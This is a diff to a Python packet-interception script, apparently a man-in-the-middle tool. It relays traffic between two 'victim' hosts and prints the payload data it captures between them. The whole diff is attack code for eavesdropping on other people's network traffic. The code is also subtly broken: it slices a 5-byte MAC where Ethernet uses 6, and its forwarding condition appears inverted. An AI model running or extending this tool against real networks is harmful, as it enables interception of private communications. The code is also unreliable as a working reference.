@@ -84,6 +84,7 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         packet = packet[0]
         ethernet_length = 14
         eth_header = packet[:ethernet_length] #Ethernet header is 14 bytes
+        srcMACpacked = eth_header[6:11]
         unpacked_eth = unpack('>6s6sH', eth_header)
         #  unpacked_eth:
         #-----------------
@@ -125,9 +126,9 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
 
             #Forward packet to victim
             new_dst_MAC = None
-            if dstIP == Host_One_IP:
+            if srcMACpacked == Host_One_MAC and dstIP != myIP:
                 new_dst_MAC = Host_One_MAC
-            elif dstIP == Host_Two_IP:
+            elif srcMACpacked == Host_Two_MAC and dstIP != myIP:
                 new_dst_MAC = Host_Two_MAC
             #Reconstruct packet with actual MAC
             if new_dst_MAC != None:
@@ -159,7 +160,7 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
             data = packet[header_size:]
             if len(data) > 0 and ((srcIP == Host_One_IP and dstIP == Host_Two_IP) or (dstIP == Host_One_IP and srcIP == Host_Two_IP)):
                 data_string = str(data)
-                print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + data_string)
+                print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + data_string[2:len(data_string)-1])
 
 # Starts the packet sniffer thread
 def start_sniffer():
